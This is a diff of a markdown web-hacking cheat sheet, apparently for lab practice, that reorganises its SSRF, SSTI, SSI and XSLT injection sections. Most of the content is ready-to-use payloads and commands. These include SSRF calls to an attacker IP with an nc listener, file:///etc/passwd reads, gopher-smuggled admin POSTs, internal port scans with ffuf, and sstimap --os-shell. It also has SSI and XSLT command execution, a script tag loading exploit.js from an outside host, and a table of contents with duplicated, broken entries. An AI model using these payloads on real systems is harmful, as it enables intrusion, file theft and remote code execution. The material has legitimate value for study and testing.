@@ -15,10 +15,13 @@ Overview
 11. - [Command Injection](#11---command-injection)
 12. - [File Uploads](#12---file-uploads)
 13. - [Server-Side Attacks](#13---server-side-attacks)
-14. - [Sensitive Data Exposure](#14---sensitive-data-exposure)
-15. - [HTML Injection](#15---html-injection)
-16. - [Cross-Site Request Forgery (CSRF)](#16---cross-site-request-forgery-csrf)
-17. - [Exploit Research](#17---exploit-research)
+14. - [Server-Side Attacks](#13---server-side-attacks)
+15. - [Server-Side Attacks](#13---server-side-attacks)
+16. - [Server-Side Attacks](#13---server-side-attacks)
+17. - [Sensitive Data Exposure](#14---sensitive-data-exposure)
+18. - [HTML Injection](#15---html-injection)
+19. - [Cross-Site Request Forgery (CSRF)](#16---cross-site-request-forgery-csrf)
+20. - [Exploit Research](#17---exploit-research)
 
    
 #1. - Web Requests
@@ -892,29 +895,54 @@ file';select+sleep(5);--.jpg
 file<script>alert(window.origin);</script>.jpg
 ```
 
-#13. - Server-Side Attacks
+#13. - Server-Side Request Forgery (SSRF)
 -----------------------------------------
 
-- Server-Side Request Forgery (SSRF)
-
-*Allows an attacker to cause the server-side application to make requests to an unintended location.*
+- External Access
 
 ```
-dateserver=http://<Attacker IP address>:<port>&date=2024-01-01
-dateserver=http://127.0.0.1:8080&date=2024-01-01
+$ nc -nlvp 8000
+dateserver=http://<Attacker IP address>:8000&date=2024-01-01
+```
+
+- Internal Access
+
+```
+dateserver=http://127.0.0.1/index.php&date=2024-01-01
+```
+
+- Internal Port Scan
+
+```
 dateserver=http://127.0.0.1:81&date=2024-01-01
+dateserver=http://127.0.0.1:82&date=2024-01-01
 $ seq 1 10000 > ports.txt
 $ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
+```
+
+- Internal Directory Brute-Force
+
+```
 $ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
+```
+
+- Local File Inclusion (LFI)
+
+```
 dateserver=file:///etc/passwd&date=2024-01-01
-gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
+```
+
+- Gopher POST Request
+
+```
 dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
 $ python2.7 gopherus.py --exploit smtp
 ```
 
-- Server-Side Template Injection (SSTI)
+#14. - Server-Side Template Injection (SSTI)
+-----------------------------------------
 
-*Allows an attacker to use native template syntax to inject a malicious payload into a template, which is then executed server-side.*
+- Test String
 
 ```
 ${{<%[%'"}}%\.
@@ -939,7 +967,7 @@ ${{<%[%'"}}%\.
 {{ ['id'] | filter('system') }}
 ```
 
-- Tools
+- Automated Exploitation
 
 ```
 https://github.com/epinna/tplmap
@@ -951,22 +979,43 @@ $ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
 $ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
 ```
 
-- Server-Side Includes (SSI) Injection
+#15. - Server-Side Includes (SSI) Injection
+-----------------------------------------
 
-*Arise when an application incorporates user-controllable data into response that is then parsed for Server-Side Include directives.*
+- Print Variable
 
 ```
-<!--#name param1="value1" param2="value" -->
 <!--#printenv -->
+```
+
+- Change Config
+
+```
 <!--#config errmsg="Error!" -->
+```
+
+- Print Specific Variable
+
+```
 <!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
+```
+
+- Execute Command
+
+```
 <!--#exec cmd="whoami" -->
+```
+
+- Include Web File
+
+```
 <!--#include virtual="index.html" -->
 ```
 
-- eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection
+#16. - eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection
+-----------------------------------------
 
-*Arise when an attacker can manipulate XSLT transformations performed on the server.*
+- Information Disclosure
 
 ```
 <xsl:value-of select="system-property('xsl:version')" />
@@ -974,12 +1023,22 @@ $ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
 <xsl:value-of select="system-property('xsl:vendor-url')" />
 <xsl:value-of select="system-property('xsl:product-name')" />
 <xsl:value-of select="system-property('xsl:product-version')" />
+```
+
+- Local File Inclusion (LFI)
+
+```
 <xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
 <xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
+```
+
+- Remote Code Execution (RCE)
+
+```
 <xsl:value-of select="php:function('system','id')" />
 ```
 
-#14. - Sensitive Data Exposure
+#17. - Sensitive Data Exposure
 -----------------------------------------
 
 - Source Code
@@ -990,7 +1049,7 @@ OR
 CTRL + U
 ```
 
-#15. - HTML Injection
+#18. - HTML Injection
 -----------------------------------------
 
 - Hyperlink
@@ -1000,7 +1059,7 @@ CTRL + U
 ```
 
 
-#16. - Cross-Site Request Forgery (CSRF)
+#19. - Cross-Site Request Forgery (CSRF)
 -----------------------------------------
 
 - Password Change
@@ -1009,7 +1068,7 @@ CTRL + U
 "><script src=//www.example.com/exploit.js></script>
 ```
 
-#17. - Exploit Research
+#20. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
